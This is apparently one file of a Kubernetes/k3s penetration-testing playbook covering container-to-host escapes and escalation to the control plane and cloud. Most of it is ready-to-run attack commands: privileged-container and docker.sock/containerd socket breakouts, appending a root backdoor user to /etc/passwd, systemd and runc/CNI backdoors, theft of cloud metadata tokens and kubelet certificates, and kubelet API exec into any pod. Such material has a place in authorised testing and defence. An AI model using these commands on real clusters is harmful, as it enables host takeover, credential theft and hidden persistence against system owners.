# 📄 **15_node_escapes.md**

### *Phase 6 — Node Breakout, Host Access & Cluster Domination*

**Mi Familia Edition — Kubernetes / k3s Pentest Diary**

---

````markdown
# 15 — Node Escapes & Host Breakout
### Phase 6: From Container → Host → Control Plane → Cloud

A compromise of a **single Kubernetes node** is one of the most catastrophic events possible in a cluster.  
At this stage:

- Pod isolation boundaries disappear  
- Secrets and workloads become transparent  
- The attacker gains the ability to impersonate the kubelet  
- Cloud IAM pivoting becomes possible  
- The cluster can be fully subverted without kubectl logging  

This file captures the *complete* playbook for escalating from pod → node → control plane → cloud.

---

# 🧨 1. High-Risk Indicators for Node Breakout
If any of these conditions exist, assume node compromise is possible:

- `privileged: true`
- `hostNetwork: true` or `hostPID: true`
- `hostPath:` volumes (especially `/`, `/etc`, `/var/run`, `/proc`)
- Mounted container runtime sockets (`docker.sock`, `containerd.sock`)
- Dangerous capabilities: `SYS_ADMIN`, `SYS_PTRACE`
- Full access to `/sys`, `/proc`, `/dev`
- Node running old kernels (Dirty Pipe, OverlayFS exploitable)
- PodSecurity disabled or permissive

A single misconfigured workload frequently leads to full node takeover.

---

# 🧱 2. Classic Privileged-Container Escape

The golden path:

```bash
nsenter --mount=/proc/1/ns/mnt -- /bin/sh
````

If `/` is the host rootfs, you're out.

Alternative:

```bash
chroot /host
```

Or:

```bash
mount --bind / /mnt && chroot /mnt
```

---

# 📦 3. hostPath Mount Escapes

Check for host filesystem exposure:

```bash
grep hostPath pod.yaml
```

Especially dangerous paths:

* `/`
* `/etc`
* `/root`
* `/var/lib/kubelet`
* `/run/containerd`
* `/var/run/docker.sock`

Pivot example:

```bash
echo 'backdoor:x:0:0::/root:/bin/bash' >> /host/etc/passwd
```

Or drop persistence:

```bash
cp pwn.service /host/etc/systemd/system/
```

---

# 🧲 4. Docker Socket Escape (`docker.sock`)

If exposed:

```bash
docker run -it --privileged -v /:/host alpine chroot /host sh
```

This is **instant root on the host**.

---

# 🔧 5. containerd Socket Escape

Modern Kubernetes primarily uses containerd:

```bash
ctr -n k8s.io containers list
```

Spawn a privileged breakout container:

```bash
ctr -n k8s.io run \
  --privileged \
  --mount type=bind,src=/,dst=/host,options=rbind:rw \
  docker.io/library/alpine:latest escape chroot /host sh
```

This is the #1 escape vector in 2024–2025 clusters.

---

# 🧬 6. CAP_SYS_ADMIN Escapes

If container has CAP_SYS_ADMIN:

```bash
unshare -m /bin/sh
mount -o bind / /mnt
chroot /mnt
```

Cgroups tricks (v1):

```bash
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/memory.force_empty
```

---

# 🛠️ 7. Kernel Exploits

Old nodes are vulnerable to:

* Dirty COW (CVE-2016-5195)
* Dirty Pipe (CVE-2022-0847)
* OverlayFS exploits (multiple)
* runc container breakout vulnerabilities

Always check:

```bash
uname -a
```

If kernel < 5.15 or unpatched → high probability of breakouts.

---

# 📡 8. Host Post-Escape Enumeration

Once you’re on the host:

### Processes

```bash
ps aux
```

### Runtime info

```bash
systemctl status containerd docker
```

### Kubelet configuration

```bash
cat /var/lib/kubelet/kubeconfig
ls -la /var/lib/kubelet/pki
```

### OverlayFS rootfs:

```bash
ls /var/lib/containerd/io.containerd.runtime.v2.task/k8s.io/
```

### Cloud metadata services:

AWS:

```bash
curl http://169.254.169.254/latest/meta-data/
```

GCP:

```bash
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Azure:

```bash
curl -H Metadata:true \
  http://169.254.169.254/metadata/identity/oauth2/token
```

---

# 🔱 9. Kubelet API (Port 10250) Abuse

Critical paths:

```bash
curl -k https://localhost:10250/pods
curl -k https://localhost:10250/metrics
```

If anonymous auth enabled → **complete cluster compromise**.

Exec into *any pod*:

```bash
curl -XPOST -k \
  "https://localhost:10250/exec/ns/pod/container?command=/bin/sh&stdout=1&stdin=1&tty=1"
```

Read logs for *any* pod:

```bash
curl -k https://localhost:10250/logs/ns/pod/container
```

---

# 📁 10. Runtime Directory Tampering

containerd:

```
/var/lib/containerd/io.containerd.runtime.v2.task/k8s.io/<POD>/rootfs/
```

Modify rootfs of running pods:

* Add SSH keys
* Replace binaries
* Inject crypto miners
* Add LD_PRELOAD persistence

Docker:

```
/var/lib/docker/containers/<CONTAINER>/rootfs/
```

These attacks **bypass audit logs**.

---

# 🌩️ 11. Control Plane Escalation from Node

Nodes often have:

```
/var/lib/kubelet/pki/kubelet-client-current.pem
```

Test API access:

```bash
curl -k --cert kubelet-client-current.pem --key kubelet-client.key \
  https://<API>/api/v1/nodes
```

If `system:nodes` clusterrole is overly permissive →
You now have **cluster-admin**.

---

# ☁️ 12. Cloud IAM Escalation

Node IAM roles often allow:

* ECR read/write
* S3 bucket access
* Secrets retrieval
* Route53 zone manipulations
* EC2 management
* KMS decrypt (!!)
* SSM SSM access

AWS example:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Cloud compromise → full cluster compromise → supply chain compromise.

---

# 🧠 13. Node Escape Decision Tree (GitHub-Safe Diagram)

```mermaid
flowchart TD

A["Pod Access"] --> B{"Privileged?"}
B -->|Yes| C["nsenter → Host"]
B -->|No| D{"hostPath Mount?"}

D -->|Yes| E["chroot /host → Host"]
D -->|No| F{"Runtime Socket?"}

F -->|docker.sock| G["Docker → Privileged Container → Host"]
F -->|containerd.sock| H["ctr run → Host"]

F -->|None| I{"CAP_SYS_ADMIN?"}
I -->|Yes| J["Namespace Escape → Host"]

C --> K["Host Recon"]
E --> K
G --> K
H --> K
J --> K

K --> L{"Cloud Metadata?"}
L -->|Yes| M["Cloud IAM Pivot"]
L -->|No| N["Kubelet Cert Abuse"]

M --> O["Control Plane Takeover"]
N --> O
```



---

# 🔬 14. Runtime-Specific Breakouts (Exhaustive)

## containerd

* Use `ctr tasks list`
* Direct privileged container spawn
* OverlayFS rootfs mutation

## Docker

* `docker.sock` → host root in one command
* Legacy clusters extremely vulnerable

## CRI-O

* `crictl exec`
* Namespace leakage via `/proc/<pid>/root`

---

# 🛰️ 15. Node Forensics (Secrets & Artifacts to Steal)

| Path                                  | Description                      |
| ------------------------------------- | -------------------------------- |
| `/var/lib/kubelet/pki`                | Node certs → impersonate kubelet |
| `/var/lib/kubelet/kubeconfig`         | Node API credentials             |
| `/var/log/containers`                 | Pod logs containing secrets      |
| `/var/lib/kubelet/pods/<UID>/volumes` | Secrets, configmaps              |
| `/run/containerd/`                    | Runtime metadata                 |
| `/opt/cni/bin/`                       | Tamper-ready persistence         |

---

# 🛡️ 16. Persistence After Node Breakout

### Modify CNI binaries

Runs on EVERY pod network setup.

### Systemd backdoors

Drop backdoor units into:

```
/etc/systemd/system/
```

### Replace runc

Backdoor every new container.

### Mutate container rootfs

Invisible to Kubernetes-level logs.

---

# 📈 17. High-Level Attack-Path Diagram


---

# 🚨 18. Detection Gaps (Why Blue Teams Lose)

Most organizations do *not* monitor:

* Kubelet API 10250 requests
* containerd privileged tasks
* OverlayFS changes
* hostPath modifications
* Metadata service access from pods
* kubelet certificate usage

Node compromises often go undetected for **months**.

---

# 🎯 19. Summary — Planetary Extinction-Level Event

A node compromise gives:

✔ kubelet impersonation
✔ full secret access
✔ workload mutation
✔ cloud IAM takeover
✔ persistence that survives cluster rebuilds
✔ silent control of the entire fleet

Defenders must treat node breakouts as:
**SEV-1 / Immediate cluster shutdown and secret rotation**

Proceed to:
➡️ `16_post_exploitation.md`

##
##
